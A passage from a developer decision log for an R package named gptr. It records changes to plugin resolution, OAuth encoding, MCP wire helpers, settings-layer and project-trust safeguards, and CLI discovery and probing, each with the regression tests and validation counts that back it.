   entry.** The plan's prose says "the most recently updated existing `installPath`", but its
   code took the newest entry first and skipped the whole plugin when that path was gone. A
   plugin whose newest install had been removed then vanished, although an older install was
   still on disk. Entries whose path does not exist are now dropped first, and the newest of the
   rest is used. The plan's code also subset every entry with `[[`. So a non-object entry, or a
   plugin given as one object instead of report 16's array of entries, stopped every
   `plugin_resolve()` that reached the Claude step with `subscript out of bounds`. The same
   happened when the file was valid JSON but not an object. Such entries and plugins are now
   skipped, and a `lastUpdated` that is not one string sorts last.
3. **A `~` path expands with `user_home()` (IC-63).** The plan tested `dir.exists(name)` on the
   raw name, which uses R's own tilde expansion, and then normalised it with `path_norm()`, which
   uses `user_home()`. The two can differ (on Windows `user_home()` is `USERPROFILE` while R
   expands `~` to `R_USER` or `HOME`), and IC-63 says user paths never go through R's
   expansion. `plugin_resolve()` now tests `dir.exists(path_norm(name))`. Order, results and
   errors are otherwise unchanged.
4. **An installed Claude plugin without a manifest name is named by its installed key**
   (review round 1). The plan resolved an installed Claude plugin with
   `plugin_from_dir(<installPath>)`, which names a plugin without a manifest name after
   `basename(path)`; it used the key only when the directory was not a plugin at all. A Claude
   `.claude-plugin/plugin.json` is optional (report 16 sections 2.15 and 3.8), and an install path
   is `~/.claude/plugins/cache/<marketplace>/<plugin>/<version>/`. So a bundle with only
   `skills/`, an empty `.claude-plugin/`, a `.claude-plugin/` holding only `marketplace.json`, or
   a manifest whose `name` is not one string, was named after its version or commit directory
   (`3b600518a637`). Task 10 builds `source = plugin:<name>`, the plugin table entry and the
   `/<plugin>:<cmd>` commands from that name. The new internal
   `plugin_from_claude_install(name, path)` keeps the manifest's name when it is one non-empty
   string and otherwise uses the installed key without `@<marketplace>`; `plugin_resolve()`'s
   Claude step calls it, with the plan's fallback for a directory that is not a plugin. A path
   given directly is still named by `plugin_from_dir()` (no key exists there). Task 11's
   `plugin_candidates()` repeats the plan's Claude loop and should call the same helper.

Five regression tests follow the plan's 4 (66 expectations) under
`# Task 9 adaptations (D-088)`: non-object manifests (item 1), installed Claude plugin entries
(item 2), a `~` path with `user_home()` mocked away from `HOME` (item 3), and a package plugin read
from a fake library through its `DESCRIPTION` only (`Config/gptr/plugin`, the `Config/gptr/api`
fallback, the `inst/gptr/plugin.json` API winning over `Config/gptr/api`, a normalised name found
by the library scan, and no namespace loaded), and installed Claude plugins without a manifest
name (item 4: `skills/` only, an empty `.claude-plugin/`, `marketplace.json` only, a numeric
`name`, not a plugin directory, and a manifest name that is kept). The package test covers
plan-literal code; the plan's tests reached no package plugin. With the first four, against the
plan-literal source the file gave
`[ FAIL 3 | WARN 0 | SKIP 0 | PASS 203 ]`: the plan's 15 pass and the first three regression
tests stop with `subscript out of bounds` (twice) and the plan's "not a plugin directory" error.
A probe (`dev/.validation/P17/task9-probe.log`) shows the other differences one by one: the
plan-literal code keeps `[1, 2]` as the manifest, gives no diagnostic for `[1, 2]` or `null`, and
gives no install path for a plugin whose newest install is gone. The fifth test (19
expectations) fails 5 against the round-1 source, whose Claude step was the plan's literal code
(`[ FAIL 5 | WARN 0 | SKIP 0 | PASS 252 ]`, `dev/.validation/P17/task9-fix1-red.log`): the
names are `3b600518a637`, `0a1b2c3d4e5f`, `1.0.0` and `2.0.0`. Every later P17 count for
`test-ext-plugins.R` is 175 higher instead of 109 (IC-74): 82 -> 257 (this task), 133 -> 308,
166 -> 341, 184 -> 359. Acceptance 1 rises by 66 on top of D-072, D-074, D-084 and D-086
(679 -> 745), acceptance 3a becomes 359 and acceptance 4c 522.

Validation: `progress/P17.md`, Task 9. `^ext-plugins$`: red
`[ FAIL 8 | WARN 0 | SKIP 0 | PASS 176 ]`, green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 238 ]`; after
review round 1 (item 4) red `[ FAIL 5 | WARN 0 | SKIP 0 | PASS 252 ]`, green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 257 ]`; lint clean.

## D-089 - P18 OAuth building blocks: form values are always percent-encoded from UTF-8, query pairs split at their first `=` and tolerate malformed escapes, redirect and metadata fields match exactly, challenges also read token values, metadata endpoints are single strings and a scope vector is joined (2026-10-04)

P18 Task 1 (`R/auth-oauth.R`). The plan's 8 tests are kept byte for byte (one
`withr::defer(dead$kill())` added, conventions section 7) and the rest of the source is the
plan's. Six places of the plan-literal code changed:

1. **`form_encode()` uses `curl::curl_escape()`** on `as_utf8()` values (curl is an Import).
   `utils::URLencode(reserved = TRUE)` keeps `repeated = FALSE`, so a value already containing a
   `%xx` sequence (`"50%25"`, possible in a client secret, code or refresh token) was sent
   unencoded and decoded to a different value by the server; multibyte characters were split
   through the native locale. An all-`NULL` field list gives `""`, not `"="`.
2. **`query_parse()`** splits each pair at its first `=` (`strsplit()` drops trailing empty
   pieces, so a padded value `abc==` became `abc=`), skips empty pairs and decodes with
   `curl::curl_unescape()`, which keeps a malformed escape as typed; `utils::URLdecode()` warned
   on `%zz` and stopped with "embedded nul in string" on a trailing `%` in a pasted redirect.
3. **Exact field access** (`[[`) in `oauth_parse_redirect()` and `oauth_check_metadata()`: with
   `$`, a redirect carrying `code_x` but no `code` returned `code_x`'s value as the code, and a
   missing `iss` or `error` would partially match `issuer` or `error_description`.
4. **`oauth_parse_challenge()`** also reads RFC 7235 token values (`error=invalid_token`) and
   quoted-pair escapes, with parameter names in lower case (RFC 7235: case-insensitive).
5. **`oauth_check_metadata()`** refuses metadata whose authorization or token endpoint is not
   one non-empty string (the plan accepted any character vector).
6. **`oauth_authorize_url()`** joins a scope vector with spaces and drops empty scopes (the
   plan's `length(scope) && nzchar(scope)` stopped on a two-element scope).

One regression test (9 expectations) follows the plan's tests; against the plan-literal source
all 9 fail (`dev/.validation/P18/task1-extra-red-against-plan-literal.log`). Every later P18
count for `test-auth-oauth.R` is 9 higher (Task 2: 99 -> 108; the five P18 test files together:
490 -> 499).

Validation: `progress/P18.md`, Task 1. `^auth-oauth$`: red `[ FAIL 8 | WARN 0 | SKIP 0 | PASS 0 ]`,
green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 56 ]`; lint clean.

## D-090 - P18 MCP wire helpers: placeholders expand in one pass with literal variable values and expanded defaults, scalars that do not convert are argument errors, whole numbers up to 2^53 - 1 are sent with every digit, malformed cache files read as absent, logs rotate portably, and env entries become strings (2026-10-04)

P18 Task 3 (`R/mcp-client.R`). The plan's 7 tests are kept byte for byte (the cache test also
points `R_USER_CACHE_DIR` at a per-test directory, the plan's per-test user-directory rule) and
the rest of the source is the plan's. Six places of the plan-literal code changed:

1. **One-pass placeholder expansion** (`mcp_expand1()`, `mcp_placeholder_value()`,
   `mcp_placeholder_re`). The plan re-scanned the string after each splice, so a variable value
   containing `${OTHER}` was expanded again, more than 50 placeholders stayed unexpanded, and a
   home or project path containing `${userHome}`/`${workspaceFolder}` never terminated. A
   variable's value is now spliced in literally; a `:-` default (config text, balanced braces)
   is expanded in turn, so `${DB:-${workspaceFolder}/data.db}` still works. `NA` stays `NA`. A
   default with an unbalanced `{` leaves its placeholder unexpanded.
2. **Strict scalars** (`mcp_scalar()`, `whole()`, `mcp_number()`, `mcp_coerce()`): a value that
   does not convert to one non-missing finite scalar (`"abc"`, `Inf` or `-Inf` for a number) is
   `gptr_error_invalid_argument` instead of JSON `"NA"` or `"Inf"`; `Inf` is not a whole number.
   A whole number beyond the integer range, up to 2^53 - 1 (RFC 8259 section 6), is sent as
   verbatim JSON with every digit (`json_verbatim(sprintf("%.0f", v))`, for `integer` and
   `number` properties): `json_encode()` keeps 15 significant digits, so `1759600000000123`
   would arrive as `1.75960000000012e+15` (the plan sent `"NA"` for an `integer`). An `integer`
   beyond 2^53 - 1 is an argument error. A length-1 `NA` is omitted at every level (also under
   `anyOf`).
3. **`mcp_value()`** simplifies with `jsonlite::parse_json(simplifyVector = TRUE)` (same result
   as `fromJSON()`, never reads its input as a file or URL).
4. **Caches**: a cache file that is not a JSON object reads as absent (the plan's era read
   stopped on `$` of an atomic vector), and so does an era entry whose `era` is not `"modern"`
   or `"legacy"` or whose `date` is not one string (`as.POSIXct()` stopped on a list or a
   vector, on the handshake path, until the file was deleted); `mcp_era_get()` reads its fields
   with exact `[[`. `mcp_tools_cache_fresh()` always returns a flag.
5. **Logs**: `mcp_log_append()` joins text given in pieces and removes the old `.1` before
   rotating (`file.rename()` does not replace an existing file on Windows).
6. **Env and header maps** (new `mcp_map_chr()`): numbers and logicals become their JSON text
   (`"8080"`, `"true"`) and names are kept, so `child_env(set =)` accepts them; secret
   registration walks env entries by position and skips unnamed ones (the plan stopped with
   "subscript out of bounds"). The helper is deliberately not called `mcp_chr()`: Task 6 defines
   `mcp_chr()` in `R/mcp-config.R` (plan line 4364), which drops names and writes `"TRUE"`; a
   second definition would fail `test-arch-layers.R` ("every function one home"), and Task 6's,
   collated later, would win and leave env unnamed, which `child_env()` refuses. Task 6 keeps
   the plan's `mcp_chr()` unchanged.

Four regression tests (22 expectations) follow the plan's tests; against the plan-literal source
the first 14 fail 7 (with 3 coercion warnings; the expansion test stopped by a 3 s bound) plus 4
in a second probe of the expansion test's later expectations
(`dev/.validation/P18/task3-extra-red-against-plan-literal.log`); the 8 added in review round 1
fail 5 against the round-0 source (`task3-fix1-red.log`). Every later P18 count for
`test-mcp-client.R` is 22 higher (Task 4: 94 -> 116; Task 5: 124 -> 146; the five P18 test files
together: 499 -> 521).

Validation: `progress/P18.md`, Task 3. `^mcp-client$`: red `[ FAIL 7 | WARN 0 | SKIP 0 | PASS 0 ]`,
green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 66 ]` (also in a C locale); lint clean.

## D-091 - P08 settings files: the providers setting validates local_only (IC-74), a lock being released is not stale, a control refusal names the running tool, a settings file that is not a JSON object is never rewritten, and a rewrite keeps the JSON types of the keys it does not change (2026-10-04)

P08 Task 1's literal `R/gptr-config.R` predates IC-74. Behaviours changed, which P08's later tasks,
P11 and P15 consume:

1. **`providers.<id>.local_only` is TRUE or FALSE.** 07-local-ollama.md section 5 makes
   `providers$ollama$local_only` "a scalar non-NA logical" (default `TRUE`). The plan's validator
   of the core `providers` setting checked only for a named list; `settings_check_providers()`
   also requires every `providers.<id>` entry to be an object and `local_only`, when given, to be
   `TRUE` or `FALSE` (`gptr_error_invalid_argument`, `arg = "providers.<id>.local_only"`). `NULL`
   means unset, which P05's `catalog_local_only()` reads as the strict `TRUE`. Validation does not
   protect the value: the run's `safety$ollama_local_only` (D-014, D-017) must be built from the
   user settings file and the session layer only (human configuration), never from the merged
   layers, the project or user-level project file, `options()`, `.opts` or call data, where a
   value may only tighten. That is an obligation of P08 Tasks 3 and 9; Task 4's `egress_check()`
   applies the effective-origin rule of D-020 item 1.
2. **A lock being released is not stale.** `lock_stale()` read the pid file after a
   `file.exists()` check, so an owner releasing the lock in between made `read_utf8()`'s error
   escape from `file_lock()` and `settings_write()`. An unreadable pid file now counts as not
   stale and the 50 x 100 ms loop retries (IC-71). Review round 1: the same release in the other
   branch, a lock directory that is gone (`file.info()$mtime` `NA`), counted as stale, so
   `file_lock()` could `unlink()` a lock another writer had taken in the meantime and two
   read-modify-writes could overlap (a lost update). A missing lock directory, or an unknown age,
   is now not stale either; an empty lock directory older than 30 s still is.
3. **The refusal names the running tool.** `control_check()` fills the `tool` field of
   `gptr_error_permission` from `run$tool_call$name` (else `"r"`), as P06's
   `session_control_check()` does; the plan always said `"r"`.
4. **A settings file that is not a JSON object is never rewritten (review round 1, contract
   11).** The plan's `settings_write()` merged the patch into `settings_file_read()`, which reads
   a malformed file (or a top-level array or scalar) as empty, so one write, such as Task 4's
   egress acknowledgement or P11's `perm_rules_update()`, silently replaced the file and lost
   every key, `permissions.deny` included. The read-modify-write now loads the file with
   `settings_file_load()` (`settings_decode(strict = TRUE)`): text that does not decode to a
   JSON object is `gptr_error_workspace` (`path`), signalled under the lock before anything is
   written, so the file and its cache entry are unchanged and the lock is released. A blank file
   is still the empty object. The layered reads stay lenient (`settings_parse()`: a diagnostic
   and empty; a non-object file is now a diagnostic too). P11 re-signals that `gptr_error`
   unchanged. Task 2's replacement `settings_write()` must keep `settings_file_load()`.
5. **A rewrite keeps the JSON types of the keys it does not change (review round 1, contract
   11).** The merge base was the `json_simplify()`d value, so a one-element array under a key
   `settings_arrays()` does not know (a plugin's dotted setting, `providers.<id>.models`) was
   written back as a scalar. `settings_write()` now merges into the unsimplified
   `json_decode()` object, which `json_encode()` writes back with the same types (arrays,
   `{}`, `[]`, `null`); `settings_arrays()` still keeps the known name arrays arrays. It returns
   the merged value as `settings_read()` simplifies it.

Validation: `progress/P08.md`, Task 1. `^gptr-config$`: red `[ FAIL 7 | WARN 0 | SKIP 0 | PASS 0 ]`,
green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 49 ]` (plan 30; the IC-74 test adds 15, the tool-name
test 4, which fails 1 against the plan-literal line); lint clean. Review round 1 added three tests
(21 expectations): against the round-0 source they fail 12
(`dev/.validation/P08/task1-fix1-red.log`: `[ FAIL 12 | WARN 0 | SKIP 0 | PASS 58 ]`), and the
lock test fails 2 against the plan-literal `lock_stale()` (`task1-fix1-red-lock-against-plan-literal.log`);
final `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 70 ]`, so every later plan count for `test-gptr-config.R` is
40 higher (Task 2: 55 -> 95; Task 3: 79 -> 119; Task 4: 97 -> 137; Task 7: 130 -> 170).

## D-092 - P08 project trust: both .env files P03 discovers are trust-gated, the fingerprint is the hash of a canonical JSON object and its cache also keys on ctime, an unreadable trust.json is never rewritten, a malformed project_trust answer has no opinion, the notice repeats per fingerprint and names the changed files, a decision is bound to the state it was asked about, gptr's own write carries trust over only its own change, and the removal of P17's test-side trust.get moves to Task 9 (2026-10-04)

P08 Task 2's literal trust code (`R/gptr-config.R`) was reconciled with IC-52, P03's real
`.env` discovery and Task 1's review obligations. Behaviours that differ from the plan literal,
which Task 9, P07, P15, P17 and P18 consume through `trust.get` and `trust_resolve()`:

1. **Both `.env` files P03 discovers are trust-gated (IC-52 "an auto-discovered `.env`").** P03's
   `dotenv_discover()` reads `.gptr/.env` and `.env` (`dotenv_project_files()`); the plan gated
   only `.env`, so a changed `.gptr/.env` kept a recorded trust and its secrets were registered.
   `trust_gated_paths()` now takes P03's list (an L0 call).
2. **The fingerprint cannot be served stale or confused.** The plan cached it by path, mtime and
   size; a same-size rewrite that restores the old mtime (`Sys.setFileTime()`, `touch -m`) left
   that stamp byte-identical (checked on APFS), so `trust_get()` kept answering `TRUE` for changed
   control files (IC-52, IC-54 "not loaded again without confirmation"). The stamp also holds the
   ctime, which every write and every mtime reset moves (on Windows ctime is the creation time,
   so this adds nothing there; the test skips on Windows). The hashed text is
   `canonical_json()` of the `{relative path: sha256}` object rather than `"<path> <hash>"`
   lines, so a file name holding a newline and a hash cannot make two file sets hash alike. A
   gated file that cannot be read hashes as `"unreadable"` (gptr cannot load it either) instead
   of failing every `trust_get()`.
3. **An unreadable `trust.json` trusts nothing and is never rewritten (Task 1 obligation,
   D-091 item 4).** The plan's `trust_store()` read the store with the lenient cached read, which
   gives an empty list for a file that is not a JSON object, so one `gptr_trust()` replaced every
   other project's decision. `trust_store()` loads with `settings_file_load()` (strict) plus a
   check that `projects` is an object (`trust_load()`): otherwise `gptr_error_workspace` (`path`)
   under the lock, with the bytes unchanged. The read side (`trust_read()`) treats such a file, or
   a `projects` that is not an object, as no records; `trust_record()` ignores an entry that is
   not an object. Other projects and an entry's other fields (`base_url_confirmed`) are kept.
4. **A malformed `project_trust` answer has no opinion.** The plan took any character `decision`
   as a decision ("maybe" meant "no", and with `remember = TRUE` was recorded). Contract 10.4
   allows `"yes"` or `"no"`; anything else is a `builtin:gateway` diagnostic and resolution goes
   on to the question or the notice.
5. **The non-interactive notice repeats per fingerprint and names the changed files.** IC-52: on
   a mismatch "non-interactively they are ignored with a notice". The plan's once-key was the
   root, so after the first notice no later change was ever announced; the key is now root and
   fingerprint (an unchanged project stays silent through `trust_mark()`), and when a trusted
   record exists the notice and the question list the changed, added and removed files. For a
   project never trusted, the question no longer says "changed since you last trusted it".
6. **A decision is bound to the state it was asked about.** `trust_store()` and `trust_mark()`
   take an optional fingerprint; `trust_resolve()` passes the one the handlers and the human saw,
   so a gated file changed while the question was open is not covered by the answer.
   `trust_resolve(root)` reads `trust_holds(root)` directly (the plan's `trust_get(root)`
   re-resolved `project_root()` from the root, which can climb to an enclosing project), and the
   replaced `settings_write()` reads the trust that held under the settings lock; it keeps Task
   1's `settings_file_load()` merge (D-091 items 4-5).
7. **P17's test-side `trust.get` (D-074 item 3) stays until Task 9.** D-074 says Task 2 must
   delete `local_trust_record()` from `tests/testthat/test-skill-discover.R` and show the test
   passing against the real service. Task 2 registers only the bootstrap entry; P01's
   `service_builtin_active()` hides it until the registry lists `builtin:gateway` (Task 9; plan
   ambiguity 19). In a scratch copy without the helper the test fails 2
   (`task2-d074-helper-removed.log`); with the bootstrap entry made visible
   (`service_builtin_active()` mocked) it passes 128 (`task2-d074-real-service-visible.log`).
   **P08 Task 9 MUST delete `local_trust_record()` (comment, definition, one call)** and show
   that test passing; until then the helper's own guard keeps it correct (it yields once
   `ext_service_has("trust.get")` holds).
8. **gptr's own write carries trust over only its own change (review round 1; IC-52 "gptr's own
   writes re-fingerprint").** The plan's `settings_write()` re-fingerprinted the whole project
   after writing `.gptr/settings.json` and recorded (or marked) that fingerprint as trusted, so a
   gated file another writer changed in that window (`.gptr/mcp.json`, `extensions/`, `.env`, or
   `settings.json` itself rewritten after gptr's write) became trusted without the human seeing
   it. `trust_holds()` now also returns the fingerprint it checked under the settings lock (`fp`),
   `settings_file_write()` returns the sha256 of the bytes it wrote (it builds the same bytes
   `write_atomic()` wrote from the text), and `trust_own_write()` lets the trust carry over only
   when every other gated file is unchanged (none added or removed) and `settings.json` holds
   exactly gptr's bytes; the new fingerprint is passed to `trust_store()`/`trust_mark()`.
   Otherwise the trust lapses and `trust_resolve()` lists the changed files and asks again.

Validation: `progress/P08.md`, Task 2. `^gptr-config$`: red `[ FAIL 17 | WARN 0 | SKIP 0 | PASS 70 ]`,
green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 144 ]` (plan 55, which is 95 after D-091; the seven
adaptation tests add 49). Against the plan-literal trust code the adaptation tests fail 17
(`dev/.validation/P08/task2-red-adaptations-against-plan-literal.log`); lint clean. Review round 1
(item 8, plus a diagnostic assertion for item 4) added two tests and one expectation (+10): red
`[ FAIL 5 | WARN 0 | SKIP 0 | PASS 149 ]` (`task2-fix1-red.log`), final green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 154 ]` (`task2-fix1-green.log`). Later plan counts for
`test-gptr-config.R` are 99 higher (Task 3: 79 -> 178; Task 4: 97 -> 196; Task 7: 130 -> 229).

## D-093 - P20 CLI discovery: the PATH test runs the platform's own branch, a directory in options(gptr.cli_path) is not a CLI, an option without the names claude/codex is an argument error, two IC-65 orderings are pinned by tests, the vendored codex.exe path is normalised, and a non-executable install location is skipped (2026-10-04)

P20 Task 1's plan-literal `R/cli-common.R` and `tests/testthat/test-cli-common.R` changed after
review rounds 1 (items 1-4) and 2 (items 5-6):

1. **The PATH test runs the platform's own branch.** The plan's test "pcli_find() scans PATH
   without a process, then the per-OS install locations" mocked `pcli_is_windows()` to `FALSE`
   and created an extensionless `claude`. On native Windows R's `file.access(x, 1)` counts only
   directories and `.exe`/`.com`/`.cmd`/`.bat` files as executable, so the Unix execute check
   dropped the PATH copy and `pcli_find()` returned `~/.local/bin/claude`: the test failed on
   the `windows-latest` jobs of `R-CMD-check.yaml`. The test no longer mocks
   `pcli_is_windows()`; it creates `pcli_exe_names("claude")[[1L]]` (`claude.exe` on Windows,
   `claude` elsewhere), so each OS runs its own discovery branch. The source is unchanged.
2. **A directory is not a CLI.** The `options(gptr.cli_path)` branch of `pcli_find()` checked
   only `file.exists()`, which is `TRUE` for a directory, so a directory was recorded and
   returned as the command. It now signals `gptr_error_cli_missing` (contract 7.20, "the
   `claude`/`codex` binary was not found"), as the PATH and install-location branches already
   skip directories; the message says "does not exist or is a directory".
3. **`options(gptr.cli_path)` must be `NULL` or a list named `claude` and/or `codex`** (04 3.1,
   "named list | NULL"). The plan ignored an unnamed value, a misspelt or mis-cased name
   (`list(Claude = )`) and fell back to PATH, so gptr ran whichever CLI PATH held instead of
   the one the user chose. A non-empty value without names, with a name other than `claude` or
   `codex`, or with a duplicated name is now `gptr_error_invalid_argument`
   (`arg = "options(gptr.cli_path)"`, through P01's `arg_abort()`), and the cache records
   `error = "invalid options(gptr.cli_path)"` so that Task 3's `status()` reports it instead of
   "not found". An empty list counts as `NULL`. Every plan use (`local_fake_cli_path()` and the
   Task 3 tests) passes a named list and is unaffected.
4. **Two IC-65 orderings are pinned by tests.** A native `claude.exe` anywhere on PATH comes
   before an earlier-on-PATH `claude.cmd` (07 6.2; it depends on the column-major order of
   `outer(dirs, names, file.path)`), and the Unix install locations are exactly `~/.local/bin`,
   `/opt/homebrew/bin`, `/usr/local/bin`, `~/.npm-global/bin` (plus `~/.claude/local` for
   claude). The code already behaved so; the tests are new.
5. **`pcli_codex_vendored()` returns a normalised path** (review round 2). It built its result
   from `dirname(shim)`, and on Windows `dirname()` returns "/" separators while a `tempfile()`
   path keeps backslashes, so the plan-literal `expect_identical(pcli_codex_vendored(shim), exe)`
   failed on the `windows-latest` jobs. The function now returns
   `normalizePath(<hit>, winslash = "/")` (callers already normalised it in `pcli_found()`), and
   the test compares it with `normalizePath(exe, winslash = "/")`.
6. **An install location without the execute bit is skipped on Unix** (review round 2), as
   `pcli_on_path()` already skips such a file on PATH. Before, a mode-0644 `~/.local/bin/claude`
   was returned and recorded as the CLI, and the run failed later in processx instead of with
   `gptr_error_cli_missing` and the install hint. Shims are exempt, since they never run. A new
   test (skipped on Windows, which has no execute bit) pins it.

Validation: `progress/P20.md`, Task 1. Four tests added and one changed (+14 expectations). Red
against the round-0 source `[ FAIL 8 | WARN 0 | SKIP 0 | PASS 32 ]`
(`dev/.validation/P20/task1-fix1-red.log`); a mutation that swaps the `outer()` arguments and
drops `/opt/homebrew/bin` fails 3 of the new ordering expectations
(`task1-fix1-mutation-red.log`); the plan-literal PATH test fails under an emulation of Windows'
`file.access()` and the new one passes (`task1-fix1-windows-emulation.log`). Round 2 added one
test and changed one expectation (+3 expectations): red against the round-1 source
`[ FAIL 4 | WARN 0 | SKIP 0 | PASS 39 ]` (`task1-fix2-red.log`). Final `^cli-common$`:
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 43 ]` (plan 26; `task1-fix2-green.log`), so every later plan
count for `test-cli-common.R` is 17 higher on macOS and Linux (Task 2 red
`[ FAIL 5 | WARN 0 | SKIP 0 | PASS 43 ]`, and so on); on Windows the execute-bit test skips, so
counts there are 14 higher plus `SKIP 1`.

## D-094 - P08 settings layers: project files and options() never relax providers.<id>.local_only, a project base URL needs trust and a one-time confirmation, dotted names merge at every level, user-scope settings come from the user file only, an explicit null in a file is a value, keys without a spec keep their option default, the printed settings are redacted, and a registered setting spec cannot redefine providers or egress (2026-10-04)

P08 Task 3's literal settings layers (`R/gptr-config.R`) predate IC-74 and leave out two contract
rules. Behaviours that differ from the plan literal, which Task 4 (egress), Task 7
(`gptr_config()`), Task 9 (the run's safety record, the activated `settings.get` service), P05
and P07 consume:

1. **Only human configuration relaxes `local_only` (IC-74; 07-local-ollama.md sections 2.1 and
   5).** The plan merged `providers` like any object, so a trusted project, `options(gptr.providers
   = ...)` or a dotted option `gptr.providers.ollama.local_only = FALSE` set the effective value to
   `FALSE`. `settings_guard()` now decides what each layer contributes: in the user file and the
   session layer (human) a `local_only` that is not `TRUE` or `FALSE` counts as `TRUE`; from a
   project file (trusted or not) and from `options()`, every `local_only` other than `TRUE` is
   dropped, so they can only tighten. An untrusted project contributes `local_only = TRUE` and
   nothing else of `providers`. The new `settings_local_only(provider = "ollama")` returns the
   protected value (`TRUE` unless the user file or the session layer set `FALSE` and nothing
   above tightened it); Task 9 freezes it into `run$opts$safety$ollama_local_only`.
2. **A project base URL needs trust and a one-time confirmation (contract 11.2 `providers` row;
   architecture 6.5 "Origin binding"; P05's plan: "enforced by P08's layers").** The plan applied a
   trusted project's `providers.<id>.base_url` at once, and P05's `provider_base_url()` binds the
   provider's credential to the origin it returns. `settings_base_url_ok()` lets the URL through
   only when the project's `trust.json` entry lists it under `base_url_confirmed` (contract
   11.8's field), or the user confirms it when asked (`gptr_confirm()`, once per project, provider
   and URL; recorded in `trust.json` when the trust is recorded, kept for the process when the
   trust was decided in this process; a "no" holds for the process). Without someone to ask the
   URL is not used, with one notice; the lower layer's URL stays. URLs in messages pass
   `redact()`.
3. **Dotted names merge at every level.** The plan resolved a dotted key inside its object and
   then let the option and session entry of that exact name replace it, so
   `gptr.providers.ollama` never reached `providers.ollama.local_only` and the dotted value
   replaced an object instead of merging into it. The plan's dotted option also overrode the
   session layer's object, against contract 11.2's order `options(gptr.*)` <
   `gptr_config(.scope = "session")`. `settings_layered(key, path)` now builds the option layer
   from `gptr.<key>` and then the option of each dotted name from the object down to the key, and
   the session layer the same way above it (less specific first, objects merged key by key,
   through `settings_guard()`), so `gptr.subagents.max_depth = 0` does not undo a session
   `subagents = list(max_depth = 2)`. The source is the highest layer whose contribution reaches
   the key (for the project file: changes it); a contribution the guard empties is no
   contribution, and a provider entry the guard emptied is dropped.
4. **`scope = "user"` settings come from the user file only.** The plan returned early for the
   literal key `egress`; the dotted read `egress.<id>` still took `gptr.egress.<id>` and the
   session entry. Every setting whose spec has `scope = "user"` (the core `egress`, and plugin
   settings that `gptr_config()` only writes at user scope, Task 7) is read from its default and
   the user file only, including its dotted names.
5. **An explicit null in a settings file is a value.** The plan's lookup treated a key present
   with a JSON null as absent, so `"compact_at": null` in the user file kept the 200000 default
   although contract 11.2 (and D-067) make a null `compact_at` disable the cap. A flat key present
   in a file is now found with its value; `settings_write()` still removes a key patched with
   `NULL`, so a null can only come from a file.
6. **A key without a `setting` spec keeps its option default.** P01's `setting_get()` returns
   `gptr_opt(key)` (the documented option default) while the service is hidden; with the plan's
   layers an option-only key such as `max_turns` would have become `NULL` once Task 9 activates
   `settings.get`. The default layer of such a key is `gptr_option_defaults[[key]]`.
7. **The printed settings are redacted.** `print(<gptr_config>)` echoes configuration values,
   which conventions section 5 says pass `redact()`: a provider `headers` value is redacted
   before the 60-character cut (the plan's cut could show the first characters of a token).
   Numbers print without scientific notation, and a value `json_encode()` cannot encode prints as
   `<class>`.
8. **A legacy `.gptr/settings.local.json` whose `permissions` is not an object is ignored**
   instead of failing the read (`$` on an atomic value).
9. **A registered `setting` spec cannot redefine `providers` or `egress` (IC-74; 07 section 5:
   extensions cannot relax `local_only`; contract 11.2: `egress` from the user file only).** The
   plan resolved a registered dotted key by itself and took every key's default and scope from
   the winning registered spec, so an extension registering `providers.ollama.local_only` (or a
   `providers` spec whose default held `local_only = FALSE`, or an `egress` spec with
   `scope = "both"`) relaxed the protected value or let options and projects acknowledge egress.
   `settings_spec()` now returns the core table entry for these two keys, a dotted key below them
   always resolves inside the object, the default passes `settings_guard()`, and
   `settings_local_only()` reads the core `providers` object directly.

Validation: `progress/P08.md`, Task 3. Review round 1 (items 3 and 9): red
`[ FAIL 18 | WARN 0 | SKIP 0 | PASS 244 ]` (`task3-fix1-red.log`), green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 262 ]` (`task3-fix1-green.log`); the service-active probe
passes 4288 (`task3-fix1-probe-service-active.log`). Before review: `^gptr-config$`: red `[ FAIL 16 | WARN 0 | SKIP 0 | PASS 154 ]`
(the plan's seven tests and eight adaptation tests, all on missing functions or the missing
`settings.get` entry), green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 238 ]` (plan 79, which is 178 after
D-091 and D-092; the adaptation tests add 60). Against the plan-literal layers (plus the same
`settings_local_only()` accessor) the adaptation tests fail 27 and the plan's seven tests pass
(`dev/.validation/P08/task3-red-adaptations-against-plan-literal.log`:
`[ FAIL 27 | WARN 0 | SKIP 0 | PASS 205 ]`). With the `settings.get` and `trust.get` services
made visible in a scratch copy, `test-gptr-config.R` and the test files of the 13 R files that
call `setting_get()` pass 4264 (`task3-probe-service-active.log`).

## D-095 - P20 version and capability probes: a probe run that timed out or exited non-zero is an error and is never cached, and the fake CLI's NULL default is if_null() without a lint suppression (2026-10-04)

P20 Task 2's plan-literal `R/cli-common.R` and `inst/gptr/fixtures/fake_cli.R` changed after
review round 1:

1. **A failed probe run is no probe** (contract 7.20: "a capability probe of `--help` (cached
   per path and mtime)"). The plan's `pcli_probe()` never looked at the run's `timed_out` or
   `status` and cached whatever `--help` / `exec --help` returned. A codex help run that timed
   out (empty output) was cached with all three required flags "missing", so the route was
   refused as "lacks --json, --ignore-user-config, --skip-git-repo-check" for the rest of the
   process even after the CLI answered; a claude help run that failed was cached as
   `bare_default = FALSE`, so the bare check passed by default. The plan's `pcli_version()`
   checked `timed_out` but not the exit status, so a failing `--version` whose stderr named any
   x.y.z number (for example "requires glibc 2.28.0") was cached as the CLI's version. Both
   probes now use the new `pcli_run_failure(res)` ("timed out", "exited with status <n>",
   "ended without an exit status", or `NULL` for status 0; the plan's Task 7
   `pcli_codex_windows_ready()` applies the same check): `pcli_version()` treats such a run as
   unreadable (status error "version unreadable", as before; the message now names the
   failure), and `pcli_probe()` records the status error "help unreadable" and signals
   `gptr_error_cli_version` with `found` = the version and `required` = "`<cli> <args>` exiting
   with status 0". Neither caches the failed run, so the next use (or
   `gptr_providers(check = TRUE)`) probes again. Every help text and version of the fake CLI
   exits with status 0, so no plan test changes; a very old codex without an `exec` subcommand
   (clap exits 2) now reads "`codex exec --help` exited with status 2" instead of naming the
   three flags, with the same class and install hint.
